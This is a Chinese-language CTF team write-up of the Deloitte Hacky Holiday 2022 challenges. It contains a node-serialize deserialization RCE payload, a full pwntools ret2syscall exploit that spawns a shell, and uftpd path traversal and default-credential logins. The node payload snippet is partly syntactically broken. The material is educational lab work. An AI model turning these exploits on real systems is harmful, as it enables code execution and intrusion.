---
title: Deloitte Hacky Holiday 2022 WriteUp
tags:
  - WriteUp
categories: CTF
urlname: deloitte-hacky-holiday-2022-writeup
abbrlink: 29790
date: 2022-07-29 08:00:21
---

简介：

本文Deloitte Hacky Holiday比赛的WriteUp，主办方的题目非常有质量而且梯度拉开非常友好。我们最终在2334只参赛队伍中取得了75名次的成绩，再接再厉！

<!--more-->

我们是SCU_HXD: NING0121, meishijia, jackfromeast

最终的名次：75th / 2334 participated teams

## **Web**

### **Teaser su admin**

这是一道关于 web 页面的题目，共一关为新手村等级。

这道题关键在于考察 "F12" 开发者模式的使用。首先题目提供了一张图片，为一个盾牌的设计图，要求我们生成同样的盾牌符号，经过尝试，我们只能生成相同配色，但不包含图案的盾牌如下：

![1-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1.png)

因此我们使用开发者模式检查元素后发现，在选择配色和花纹时，存在隐藏（hidden）选项，我们只需要将隐藏选项通过修改标签的 Class 值进行开启，就可以实现相同盾牌图形。

![1-3](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-3.png)

生成后，便展示出了 flag。

```
CTF{4DM1N_4PPR0V3D}
```

### **2-5 GRAPHING IT OUT**

第一关，要寻找到一个dashboard，根据题目中的描述需要找到网页中被隐藏的入口。打开网页的源码发现，其中存在被注释掉的a标签，根据路由找到了Grafana系统的入口。

![1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/DK-ylZ2Y4MeQzX_WsfrpwA.png)

由于这个系统在之前的课程设计中曾经使用过，初始设置的账号密码均为 admin，经过尝试之后顺利进入到表盘系统中。然后在不同的表盘 General/Sample 中发现了 flag。

```
CTF{c3deaca3fb4fec9f4900e82b9ee830c6}
```

第二关，题目描述要寻找数据，因为之前在课程设计中 grafana 和 influxDB 两个是结合起来使用的。所以就在 grafana 中查看表盘数据的来源，果然使用的是 influxDB。那么根据经验需要查询数据库中是否有想要的数据。influxDB 中的数据是以 bucket 存在的，在数据库的查询页面中，输入 buckets() ,查询之后，发现有 _monitoring\_tasks\data\flag, 四个 bucket，然后就是查询flag中的数据

```
from(bucket:"flag")
    |> range(start:0)
```

查询到flag为

```
CTF{493c709cff326b344f94acfb6f6cfd81}
```

第三关 **Uncompleted**

### **3-2 HACKY HOLIDAYS AIRLINES**

此题给出了网站的源码，通过简单的审计，猜测这是一道关于反序列漏洞的题目。如下所示，用户所传递的Cookie在没有经过其他过滤的情况下直接被反序列化，因此可能由此完成RCE。查看其完成反序列化操作的包为'node-serialize'并且版本为0.0.4，搜索后发现果然该版本的node-serialize存在反序列化漏洞CVE-2017-5941。

![2](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (1).png)

此漏洞的代码存在于`node_modules/node-serialize/lib/serialize.js`中。我们可以看到，当反序列化对象的值为`string`并且以`FUNCFLAG(i.e. _$$ND_FUNC$$_)`开头时，则会调用eval函数。也就是说，如果我们传入的字符串例如:`{"rce":"_$$ND_FUNC$$_function(){console.log('xxx')}"}`，则该语句在截取字符串后就变成了`eval(function(){console.log('xxx')})`。接着，我们还需要该函数在定义后立即执行，所以在其最后加上括号表示使用IIFE立即调用执行，即可完成RCE。所以构造的目标字符串应该形如：`{"rce":"_$$ND_FUNC$$_function(){console.log('xxx')}()"}`.

![3](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/qrbi_kEOvPYhh77r_LwZ1Q.jpeg)

虽然该漏洞存在EXP，但是尝试后发现并不能得到shell。所以此类问题还是需要一步一步本地搭环境来调试，不能急功近利。通过Docker搭建好本地环境后，通常需要完成几个步骤来测试EXP。首先，直接修改源码来调试注入的命令。对于反序列化漏洞而言，我们首先编辑注入的代码，将其序列化后，再以Base64的形式编码生成目标的Cookie字符串。

当本地环境下可以成功运行后，再通过修改请求报文的Cookie，尝试是否可以成功执行拿到Shell。实验后发现，本地搭建的环境确实可以反弹shell,但是目标环境下总是不能成功。因此，我猜想目标服务器的防火墙Drop禁止了除80端口以外的其他连接，也就无法反弹Shell。

既然SHELL拿不到，如果可以将flag.txt的内容回显到页面上也是可行的，毕竟通过网站源码我们知道flag.txt的地址。所以，我最后修改执行的命令使得flag字符串写入到index.pug文件里，然后触发反序列化漏洞后，再次请求该页面(此时注入的命令已经执行，index.pug被追加了flag字符串)即可看到flag的内容啦。

```js
var payload = '{ rce: function(){
    require('child_process').exec('cat /app/flag', function(error, stdout, stderr) { var fs = require('fs'); fs.appendFile('/app/views/index.pug', '  p '+stdout, (err) => {console.log(err);})});},
}';
var payload = serialize.serialize(y);
var payload = payload.substring(0, payload.length-2) + '()' + payload.substring(payload.length-2, payload.length);
var payload = Buffer.from(payload).('base64');
console.log(payload)


## EXPOLIT
var cookieValue = new Buffer(escape(payload), 'base64').toString();
var userInfo = serialize.unserialize(cookieValue);
```

![4](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/HKgkKtMAku6jLCyAE9ysWw.png)
### **3-3 BILLBOARD MAYHEM**

## **Pwn**

### **1-3 FACTORY RESET**

这是一道Linux下利用Web服务的漏洞拿站的题目，类似于渗透测试。

首先官方给出的VPN密钥远程连接至其内网，使得可以访问到目标主机10.6.0.100.

我们首先使用nmap对其进行端口扫描，使用-Pn参数默认目标主机存活且无需DNS域名解析。结果可以看到该主机打开了ssh的22号端口以及ftp的21号端口。

![5](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/7YdUtZL_wecmh6dzPiz-wA.png)

接着，我们继续查看ssh和ftp服务的版本信息。这里使用nmap的-A参数即可。

![6](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/WdBYRz5hgE5nsb2bQpNnCw.png)

通过结果我们可以看到该ftp服务使用的是uftpd(2.10)而且允许anonymous匿名用户登陆，ftp的可访问目录下存在着三个bash文件。

顺着思路，我们直接使用nc来连接该ftp端口且使用匿名用户身份登陆。

​![7](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/8bCHHqLj6mUsSWa5ng7C2w.png)

这个时候我继续尝试一些命令如LIST PWD等发现并没有反应，这个的主要原因是ftp协议是带外传输的，也就是说命令连接和数据连接是两个不同的TCP链接。因此我使用其他的ftp链接工具（fileZilla）去连接，并访问得到了这三个bash文件，结果这三个文件并没有什么值得注意的地方。

此时，我直接去搜索关于uftpd的相关信息，发现uftpd作为开源的ftp服务器已经更新到2.15版本，而目标机器停留在了2.10版本。接着，我找到了关于uftpd的相关漏洞，其中CVE-2020-5221路径穿越漏洞引起了我的注意，毕竟路径穿越就可以找到题目所说的敏感的stolen_data。


![8](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (6).png)

根据，[此博客](https://arinerron.com/blog/posts/6)提供的POC，我们发现FTP中的若干命令(LIST, RETR)都存在路径穿越的漏洞。不过，回到之前的问题，作为带外传输的FTP协议，我们需要另外建立一个链接来传输数据。这有两种方式，默认为主动连接，即由服务器端主动连接客户端的某个端口，这需要首先使用PORT命令提供客户端开放的端口。但是由于服务器端无法穿越NAT直接连接到我的kali，所以我该用被动链接的方式，也就是由客户端主动连接到服务器中作为数据发送的端口。具体如下所示。

![9](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (7).png)需要说明的是，PASV使得ftp进入被动模式，给出的10,6,0,100,202,9的含义是开放10.6.0.100:202*256+9端口作为数据传输。所以我是用nc远程连接其51271端口。接着在passwd中我发现存在/var/backups目录，继续使用LIST该目录发现其中存在./DATA/flag1.txt文件。欣喜若狂，至此斩获一150分的大题。

```
CTF{F0rtREss_Br3@c#3d}
```

### **4-2 ROP THE AI**

经典的一道ret2syscall的栈溢出题目。

首先拿到程序查看其基本信息，发现这是一个静态编译的小端的x86-64位程序。

![10](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/sqQNwBMtQXgHCWu2mqwXaw.png)     

接着，使用反汇编一下查看其程序逻辑。发现程序逻辑非常简单，main函数中直接调用名为vuln的函数。而在vuln的函数中，首先声明了一个0x70大小的内存空间，接着使用gets()函数获取用户输入存在此内存空间。所以显然栈溢出漏洞就存在于此。

![11](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (8).png)

要对漏洞进行利用，我们还需要知道程序所开启的保护。使用gdb-peda中自带的checksec或者下载的checksec脚本可以帮助我们查看该程序开启的保护措施。由下可见，ROPtheAI开启了Canary以及NX。简单来说，前者在弹栈前检查EBP下方的预置的Cookie是否被用户输入覆盖来判断是否存在栈溢出的情况。后者使得Data段(也就是栈所在的段)不具备执行权限，也就是说用户如果在栈中输入了shellcode也是无法执行的。

![12](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/D95JF6Hrh1qZ0ddOl9PP6w.png)

checksec脚本的原理是依赖于readelf工具查看目标程序(ELF，可执行可链接文件格式)的相关信息比如program headers(存储着程序Segment和Section的信息)、符号表(存储着程序中变量、函数名的类型、位置地址等)等。具体地，checksec对于Canary以及NX保护措施的查看方法如下所示，前者是查询符号表中是否存在__stack_chk_fail函数，后者是查询栈的执行权限。

![13](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (9).png)

这种判断Canary的方法我们可以猜想会存在假阳性，毕竟存在__stack_chk_fail函数并其不意味着被链接进去。所以具体的情况我们还是要通过动态调试程序来看是否在程序的入口和弹栈时存在对应的汇编代码。这里可以参考[CTFWiki](https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/)中对于Canary的具体讲解。本ROPtheAI就是这样一个例子，在调试时并没有发现有执行验证Cookie的汇编代码，所以我们无需思考如何绕过Canary。

对于NX，在动态调试时可以通过vmmap查看栈是否存在可执行的权限。

 ![14](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (10).png)

在摸清程序的保护措施之后，我们首先通过动态调试查看栈的结构，确定缓冲区的大小；然后构造ROP链绕过NX保护。

程序的栈结构以及入栈出栈的过程可以参考[此篇文章](https://www.cnblogs.com/clover-toeic/p/3755401.html)，介绍的非常细致。缓冲区的大小我们可以通过动态调试时查看RSP和RBP所指向的地址查看或者通过cyclic工具构造有规律的字符串，再判断溢出后RBP中所存储的内容判断偏移。由于本程序的汇编非常简单，通过调试我们可以看到栈中保存RET地址的位置距离输入点的偏移的0x70。

![15](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (11)-9054164.png)

由于NX保护的开启，我们无法通过最简单的利用gets函数在栈中嵌入一段shellcode，再将ret的地址指向该shellcode的地址，使其执行shellcode。因为存入的shellcode在data段中的栈中，该地址的指令与在text段中的指令不同，没有执行权限。

但是ROP技术可以避开此限制，成功突破NX保护。ROP(Return Oriented Programming)技术，是在栈缓冲区溢出的基础上，利用程序中已有的存在ret命令的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。其核心是利用了指令集中的 ret 指令，改变了指令流的执行顺序。

绕过NX有四种常用的方式：ret2text, ret2shellcode, ret2syscall, 以及ret2libc。第一种方式是比较直接，在程序中查找执行system('/bin/sh')的指令，并将其指令地址覆盖到栈中的ret位置。但是通常来讲，程序中可能并不会在这样的指令。第二种方式是通过write方法将shellcode写入.bss段(通常存放着全局变量，具有可执行权限)，然后再将其写入地址存放于ret位置。第三种方式是利用系统调用(32位程序是int 0x80，64位程序是syscall)并修改寄存器使得执行exceve('/bin/sh',0x0,0x0)系统调用。最后一种方式是对于动态链接的程序，利用存储在glibc(GNC的标准C语言库)中的system函数，执行system('/bin/sh').

此时，我们需要根据程序中提供的gadgets来选择使用那种方法。查看程序的gadgets我们可以使用ROPgadget工具。使用`ROPgadget --binary ~/Desktop/ROPtheAI/ROPtheAI | grep syscall` 命令我们可以发现程序中存在非常好利用的系统调用，所以我们选择使用ret2syscall的方式利用该漏洞。                 ![16](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/zayfkMQ1IrSUZOfB7QsdzQ.png)

为了执行exceve系统调用，我们需要使rax的值置为0x3b，表示exceve系统调用的编号；rdi的值置为字符串"/bin/sh\x00"的地址，注意字符串的结尾必须是0x00；rsi和rdx的值为0x00即可。因此我们需要在程序中查找gadgets来构造ROP链，使得执行系统调用时寄存器的值到位。

接着，我们在全局查找"/bin/sh"字符串，发现并没有该字符串。因此，我们需要利用gadgets向.bss段写入该字符串。首先，我们可以找到操纵rax和rdx的指令，接着我们找一个可以读写的.bss的地址，然后利用类似于mov [rdx], rax；的指令来将字符串写入该地址。具体如下所示。我们找到非常好的写入内存的指令，首先字符串'/bin/sh\x00'正好是8字节，也就是正好放入rax寄存器中，然后rdx置为待写入的地址，然后利用mov qword ptr[rdx], rax指令表示将rax的值放入以rdx的值作为地址的大小为双字(16字节显然足够)的内存中。此payload执行完，我们已将'/bin/sh'写入到地址为0x004b72e0的内存中。

```python
pop_rax = 0x0044c043 # pop rax; ret;
pop_rdx = 0x004016eb # pop rdx; ret;
writeable_memory_addr = 0x004b72e0 # bss段内地址
write_memory = 0x0043e353 # mov qword ptr[rdx], rax; mov rax, rdi; ret


payload = 120*b'A'+p64(pop_rax)+b'/bin/sh\x00'+p64(pop_rdx)+p64(writeable_memory_addr)+p64(write_memory)
```

接着，我们只需重新调整寄存器的值并调用syscall即可。完整的EXP如下所示，我使用了一次可以设置三个寄存器值的指令，最后调整rdi为writeable_memory_addr，最后ret系统调用。

```python
#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.endian = 'little'
sh = process('/home/kali/Desktop/ROPtheAI/ROPtheAI')
# sh = remote("xxx.xxx.xxx.xxx",17004)
# sh = gdb.debug('/home/kali/Desktop/ROPtheAI/ROPtheAI', gdbscript="""
# b vuln
# continue
# """)

pop_rax_rdx_rbx = 0x00479906
pop_rax = 0x0044c043
pop_rsi = 0x004087ce
pop_rdi = 0x00401931
pop_rdx = 0x004016eb
syscall = 0x004011fa
writeable_memory_addr = 0x004b72e0 # bss段内地址
write_memory = 0x0043e353 # mov qword ptr[rdx], rax; mov rax, rdi; ret

sh.recvuntil(b'Please enter your preferred configuration:')
payload = 120*b'A'+p64(pop_rax)+b'/bin/sh\x00'+p64(pop_rdx)+p64(writeable_memory_addr)+p64(write_memory)+p64(pop_rax_rdx_rbx)+p64(0x3b)+p64(0x0)+p64(0x0)+p64(pop_rsi)+p64(0x0)+p64(pop_rdi)+p64(writeable_memory_addr)+p64(syscall)

sh.sendline(payload)
sh.interactive()
```

最终成功拿到Shell。

![17](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (12).png)

最后，其实在整个EXP编写的过程中并不会顺利，所以需要我们使用pwntools自带的gdb来调试我们的payload，查看问题出在哪里再修复，这一点非常重要。此外，通过gdb.debug的方式启用程序可能会由于环境变量，导致栈的内存地址的变化。通过gdb.attach的方式连接已经运行的程序则不会存在这样的问题。

## **Reversing**

### **3-1 CRACK THE PASSWORD**

改题目提供了一个二进制的文件，用十六进制观察之后，发现师ELF文件。使用IDA反编译之后，发现该程序存在验证密码是否正确的函数。

![18](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1R8m6flUkhQITA5wzgsFgw.png)

进入validatePassword之后，发现函数的主要逻辑是验证输入字符串的长度和不同位置之间的关系(根据 特定位置字符的十进制表示来确定关系)。仔细观察之后，发现字符串中存在某些可以确定的字符，如a1[13] = 49 （刚好对应数字1），然后通过这些确定的字符，可以将其他的字符确定下来。最后通过编程将整个字符串解密出来。

![19](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/AKOl2mA8sMQQB2s149gWtA.png)

```python
password = [None] * 33


password[13] = chr(49);
password[23] = chr(57);


password[31] = chr(2*ord(password[13]) +1)
password[22] = chr((ord(password[31])|0x61) -2)
password[6] = chr(ord(password[22])>>1)
password[0] = chr(ord(password[6])-29)


password[18] = chr(ord(password[23])^0xA)
password[16] = chr(2*(ord(password[18])>>1))
password[11] = chr(2*ord(password[16]))
password[26] = chr(int(ord(password[11])/2)+7)#?
password[25] = chr(ord(password[26])+ord(password[16]))
password[21] = chr(ord(password[25])>>1)
password[7] = chr(ord(password[21])^ord(password[11]))
password[19] = chr(ord(password[7])-2)


password[1] = chr(ord(password[19])+5)
password[31] = chr(2*ord(password[13])+1)
password[30] = chr(ord(password[31])-ord(password[16]))
password[10] = chr(ord(password[30])+7)
password[28] = chr(ord(password[1])-19)
password[20] = chr(ord(password[28])^ord(password[10]))
password[17] = chr(ord(password[20])^0x40)
password[5] = chr(ord(password[17])+40)
password[8] = chr(ord(password[5])^7)
password[2] = chr((ord(password[8])>>1)+19)


password[0] = chr(2*ord(password[6])-29)
password[15] = chr(ord(password[0])^5)
password[3] = chr(ord(password[15])+53)
password[4] = chr(ord(password[3])-68)


password[32] = chr(ord(password[15])+ord(password[4]))
password[29] = chr(ord(password[32])-77)
password[14] = chr(2*ord(password[29])+3)
password[9] = chr(ord(password[14])-33)


password[12] = chr(ord(password[9])+ord(password[29]))
password[24] = chr(2*ord(password[18]))
password[27] = chr(2*(ord(password[4])+123))


print(2*(ord(password[4])+123))
for i in range(len(password)):
    if password[i]==None:
     print(i)
target = ''.join(password)
#print(str(password))
print(str(target))
```

结果为：`CTF{7a0QfB8dr1cF293Oy5a9fk9ŤA01c}`，但是Ť这个字符很明显不是ASCII编码，在仔细观察之后，发现这个字符十进制数表示为356，模256之后的结果为100。对应的字符为d

那正确的结果为

```
CTF{7a0QfB8dr1cF293Oy5a9fk9dA01c}
```

### **3-5 PIZZA PAZZI**

题目提供了一个apk文件。利用jadx进行反编译，并找到程序入口位置。根据第一题的题目，Listening in on the conversation。我们将apk文件使用keytool生成jks，再用apksigner完成v2签名，随后安装到雷电模拟器的安卓系统中。

然后使用fiddler4监控雷电模拟器发出的数据包，找到了https://pizzapazzi.challenge.hackazon.org/，访问之后得到第一关的答案。

![20](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/u_muE2nJRY2-WAioI6IVTw.png)

第二关，按照网页中显示的提示，我们可以阅读代码，从中得到更多的信息。这里我走了很多弯路，我一直以为是要动态调试这个app，但是打开之后点击Get started之后，app自动关闭。我开始怀疑是雷电模拟器版本的问题，随后下载了Android studio并安装Nexus5x的安卓模拟器，在该系统上面安装之后依然还是打不开。

之后没得办法又重新回到代码中，怀疑这些字符串是base64编码，解码之后后面的题目就迎刃而解啦。

![21](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/36NgagSGpYKpFXPjuHcAAA.png)

所以又重新回到代码上，去寻找恶意代码。这里又走了弯路，这个app本身就是不完整的。其实在函数名称设置上已经有了提示。接下来的关卡都是一样的。采用的都是base64编码，模拟的就是后台挖矿的程序。

第三关

![22](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/J4EBRWJm2Qeeu94w9gcEiw.png)

第四关

![23](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/iSLzfxsxfi72lIhl4zV18g.png)

![24](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/F6z7pc4n98L2NXa6IkYxPg.png)

### **4-3** **IDENTIFY YOURSELF**

这个题要根据题目中提供的DigitalId.apk，找出session.raw中保存的flag。

首先还是通过jadx对该apk文件进行反编译。通过反编译之后的代码，我们可以得到程序采用了AES对称加密的方式。先利用UUID生成的 32bytes 随机的十六进制字符串，对密文进行加密。再通过用户输入的PIN（4个拼接到一起的，每个4bytes，组到一起刚好是16bytes），对UUID进行加密。

然后，尝试通过在反编译之后的代码中寻找有关PIN的信息。发现并没有相关的信息。通过尝试安装软件运行发现，PIN中仅仅支持数字输入，所以呢，我们采取爆破的方式。

利用kali虚拟机生成包含4位数字的所有组合，再通过一样的解密过程，将密文解密出来。最终在发现1337即为PIN，也找到了最终的Flag。

![25](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (13).png)

此题，思路并没有多大的问题，但是由于本人对基础知识的认识不够。所以走了很多弯路。

首先，所有的字符串在内存中都是以二进制存储的，十六进制形式只是其诸多展现形式中的一种而已(此外还有8进制等)。在程序语言中，将字符串转为十六进制字符串，即是将字符串在内存当中存储的二进制----以十六进制形式展现出来。如果把real_key以十六进制展示出来的话，会是 ce1feee3......等等。

![26](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/QkVIgwLK8_8Qd5W5PQMt7A.png)

接着，如何对这些二进制编码，是编码层面的问题，这里面有大家所熟知的Ascii码，UTF-8，UTF-16等等。这些编码说白了，就是按照自己的规则去读取内存中的二进制，然后查找该二进制对应的字母或者其他控制符等等。显然一个字节byte能标识的数据显然不够，所以又出现了UTF-16、Unicode编码等。不过对于英文的话，UTF-8编码是足够了。

![27](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/rRV9NCsAVIF8kyedReM_YQ.png)

## **Crypto**

### **2-1** **ENCAPSULATION**

这是一道关于简单密码学加解密的题目，共分为三关：Encapsulation、Cipher Squabble 以及 Back to the basics。

第一关是一道简单的编码转化题。题目首先提供了一张图片 "binary.jpeg" ，直接打开发现并没有什么线索，进一步我们使用记事本打开，发现里面全是字符 " ( " 和 " 9 "，由于只有两种符号，开始猜测为摩斯电码，解码发现并不成功，后来结合图片名称，将其理解为二进制，于是将其分别转为 " 0 " 和 " 1 " 进行表示，并需要考虑如何转换成带有字母符号的字符串，于是转换成 ASCII ，得到一串新的代码。（bin2Ascii）

此时查看新的代码发现，存在最后一位为 " = "，考虑 base64 编码，进行解码后得到 flag。（baseX解码）

```
CTF{UGVwcGFpc2FwaWc}
```

第二关为简单的密码解密题。根据前一题得到的解密结果，能够发现一定线索。

![28](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (2).png)

其中第一个人是密码学家，并且搜索发现与之相关的密码加密方式为 "维吉尼亚密码" ，而改密码需要一个 Key 来帮助解密，句中提及他的中间名可以帮助，因此得到 " Battista "，最后进行解密得到 flag。（维吉尼亚解密）

```
CTF{QMVSBGFZB2LUDMVUDGVKDGhPC2NPCGHLCG}
```

第三关**Uncompleted。**同样是密码解迷题。根据前一题得到的解密结果，能够发现一定线索。

![29](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (3).png)

暂时猜测他 shuffle 的意思是某种换序加密，想到格栅密码，但是尝试并未找的 flag，同时认为他所提到的 cylinder 是某种轮盘加密，暂时不知道使用什么进行解密。

### **2-2** **SECRET CONVE'RSA'TION**

这是一道关于 RSA 计算的题目，仅一关。

本关卡提供了一个文件，包含了 RSA 计算中的公钥（N，e）以及密文 c。提供的参数较少，仅有密钥和密文，理论上是很难破解的，需要我们爆破算出两个因数 p 和 q，由于数字十分巨大爆破不好实现，因此首先考虑一些方法进行分解，经查询有以下几种情况及算法。

1. N 较小：短除法、Miller-Rabin素性测试和离散对数Pollard_rho分解；
2. N 较大：在线查询 http://factordb.com
3. e 过大或过小：Wiener’s attack
4. p 和 q 相近：费马分解

参考文档：CTF-RSA 大整数分解

因此我首先首先尝试了费马分解，并成功获取 p 和 q，进而求得 phi 和 d，最后根据公式 m = pow(c, d, n) 获取明文。

代码如下：

```python
import libnum
p = 72539188337409048434517657668785982436503618029818802387833126880251213106684983301847459281756173872849655980341983435213476251581941251979385718844779855101287148374206957436458915587712518501281793789555480805845328694482152421962093714097210685267495028743960484986044572019270471629952251128834754752071
q = 72539188337409048434517657668785982436503618029818802387833126880251213106684983301847459281756173872849655980341983435213476251581941251979385718844779768486519862521371761417707655650528352916168732086751886502287478577426433344249124093776641317837723657300923622528678618140782421245730805689484709681027
e = 65537

n = 5261933844650100908430030083398098838688018147149529533465444719385566864605781576487305356717074882505882701585297765789323726258356035692769897420620858774763694117634408028918270394852404169072671551096321238430993811080749636806153881798472848720411673994908247486124703888115308603904735959457057925225503197625820670522050494196703154086316062123787934777520599894745147260327060174336101658295022275013051816321617046927321006322752178354002696596328204277122466231388232487691224076847557856202947748540263791767128195927179588238799470987669558119422552470505956858217654904628177286026365989987106877656917
c = 176955087574615470063741472647197409875117482285309340581271852382710990213049325727125711804231234813146490233229473679126800639397642380073858980601348297248196895714845780751708931869367483971257602632592317987276609144131149239628356913355893753937582033295526684103570648143766629320982809943886265840131929175495923219383837739522744946987913271495217642469261483099144404131616847257182856944641353523297845726161862062019653065904612865722942649827600090466968124488518262272506900322544403300651512798674316560281124899873116026534973842919190849918357740307152880452169695889599662477611952919511642717417
phi = (p-1)*(q-1)
d = libnum.invmod(e,phi)
print(d)
m = pow(c, d, n)
print("m的值为:", m)
```

求得 m 后，根据提示 flag 为 CTF{xxx}，根据获得 m 前两位为 67，猜测需要转为 ASCII 码，转换后成功获取 flag。

```
CTF{RSA_br0ken}
```

## 

## **Misc**

### **1-3** **AUDIBLE TRANSMISSION**

这是一道音频wav的隐写题目，分为两关：For your eyes only 以及 Code。

第一关是频谱隐写，使用工具Audacity即可查看音频的频谱图拿到flag. 其实无论是频谱隐写还是波形隐写其音频听起来都是异常的，可以通过此方法来判断。

![30](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/BquF8GIbMHL0grUrZaxNwg.png)

```
CTF{Tagalog}
```

第二关**Uncompleted**，目前的猜测是出题人将一段code隐藏到中间的音频中啦。中间的音频听起来就是倒放，因此首先将整段音频使用Audacity提供的效果->反向（时间）来反转。但是处理之后听起来是清晰且顺畅的了，但是仍不知道是什么语言，在说什么。因为其内容上听起来没有杂音，所以猜想是使用某种成熟的对原音频影响较小音频隐写算法。目前尝试了Stegohide（Stegseek(密码爆破)），AudioStego以及LSB(wavStego，手写脚本)，但是生成的字节都是没有实义的。

## Network

### **1-1** **CHEMICAL PLANT**

这同样是一道关于 ICS（工业控制系统） 流量分析的题目，共分为四关：Find the attack point、Record everything、Know the limit 以及 True or false。

第一关非常简单，需要我们找到受攻击的组件，flag 为 CTF{component}。根据视频我们能够发现，视频中 Pressure 部分一直增加超过了限度，导致了爆炸，因此这是被攻击的组件。

```
CTF{Pressure}
```

第二关同样比较简单，需要我们找到受攻击的准确时刻。这里需要进行流量分析（Wireshark： "分析-->专家信息"），能够发现作者在其中添加了 comment 为我们进行提示。打开便能够发现第二关到第四关的所有线索。其中对第二关的线索如下：

![31](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/jvKaukugxsqAaNqx5m_8ag.png)

同样我们能够看出为 base64 编码，解码后获取 flag。（baseX解码）

```
CTF{M0DBU5_RE4D_R1GHT}
```

第三关**Uncompleted**，需要我们找到受攻击的设定值。其中对第三关的线索如下：

![32](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/wjWgdnc7_QzcVmY6i8KlLQ.png)

但是还是没搞懂这个指的设定值是说什么。

第四关，需要我们找到寄存器线圈中的数据类型，flag 为 CTF{datatype}。根据第二关线索可知其数据类型为 binary，如下：

![33](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/0_UyX98l5vObVLrL66DyFw.png)

其次他也呼应了题目的名称 True or false。

```
CTF{binary}
```

### **1-2** **YOU CAN'T SEE ME**

这是一道关于 ICS（工业控制系统） 流量分析的题目，共分为四关：Parts make a whole、whoami、Man-in-the-middle 以及 Follow me till the end。

第一关是一个数据流追踪的问题。根据题目名称我们可以推测出需要将分散的数据包进行追踪，同时我们可以发现大多为 TCP 数据包，因此我们将 TCP 流进行追踪（Wireshark：" 分析-->追踪流-->TCP" ），接着我们进行翻阅可以看到 flag。

![34](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (4).png)

```
CTF{Hacky_Holidays_ICS}
```

第二关是一个异常流量寻找的问题，flag 为 IP 地址。我们需要找到异常的组件，我的方法不一定准确（可能碰运气），我最开始是查看了流量图。（Wireshark："统计"-->"流量图"）发现有个内部 IP 频繁与外界 IP 进行数据交换，尝试发现正确。

```
192.168.198.128
```

第三关是寻找中间人攻击使用的协议，flag 为 CTF{protocol_in_capital_letters}。然后我思考了一下常见的中间人攻击方式，首先想到的是 ARP 欺骗，正确。

```
192.168.198.136 -- 00:0c:29:7f:db:1c
192.168.198.138 -- 00:0c:29:80:8c:09
192.168.198.128 -- 00:0c:29:2a:0b:dd
```

但是需要验证为什么，我查询了 ARP 的数据包，发现 136 向内部网关询问 138 的地址，网关开始询问大家 138 的地址，而 128 一直向网关传递的是自己的地址，于是 136 将 128 认为是 138 的地址，从而完成了欺骗，使 128 成为了中间人（136 -- 128 --138）。

```
CTF{ARP}
```

第四关 寻找目标机器与外部机器之间沟通的报文，主要使用了(右键选择追踪流->追踪TCP流)，再不断增加流编号的过程中，发现了339流中存在HTTP协议报文。

![35](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (5).png)

将该报文中的HTML源码复制到txt文件中再重新命名为html，打开之后即可得到flag--是一个由base64编码的图片。（筛选的过程中一度怀疑TSL协议流中蕴含着flag，想要通过数据包中传递的密钥破解数据包中加密传递的信息。但从理论上来说仅从数据包破解TSL协议的可能性不大，包中传递的也都是公钥。）

![36](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/g1biwI-jXY-HY_QDEDFCOQ.png)

```
CTF{5ERVER_15_H3R3}        
```

## **PPC**

Professionally Program Coder，即编程类题目。

### **2-4** **LOCATION ANALYSIS**

首先此题给出的目标服务器是tcp:portal.hackazon.org:17002，结合题目的描述猜想是某数据库的借口。直接用telnet模拟tcp连接进行交互，发现如下的字符互动信息，可以被当作指纹去查看背后是什么数据库在运行。

![37](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1Eauo0DZSOdtkfWORB6_-A.png)

简单搜索后发现是Redis数据库，连接上查看所有的Key，发现其中的存在"_flag"的键，查看其的值就可以得到第一关的flag。

![38](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/lYTwnjSB7DIci-cYI-S5lg.png)

```
CTF{DGErbbodqEeHQhjeDs8g}
```

